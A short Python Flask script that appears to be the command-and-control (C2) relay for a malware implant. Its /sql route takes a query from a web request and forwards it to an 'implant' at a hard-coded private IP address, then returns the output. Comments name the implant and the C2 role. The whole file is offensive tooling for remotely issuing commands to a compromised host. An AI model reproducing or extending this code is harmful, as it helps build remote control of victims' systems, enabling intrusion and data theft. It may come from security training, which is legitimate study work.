from flask import Flask
from flask import request as flask_request
import requests
from urllib.parse import urljoin
from utils import *

# Host and port of the implant
IMPLANT_HOST = '192.168.20.21'
IMPLANT_PORT = 5000

# Base URL to send requests to implant
IMPLANT_URL = f"http://{IMPLANT_HOST}:{IMPLANT_PORT}"

app = Flask(__name__)

# Send commands to implant
@app.route('/sql', methods=['GET', 'POST'])
def send_sql():
    query = flask_request.args.get('parameter')
    ret = requests.post(urljoin(IMPLANT_URL, "/sql"), params={"parameter": query})
    print(ret.text)
    return ret.text 

# Return output to c2

# Start app
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=9000)
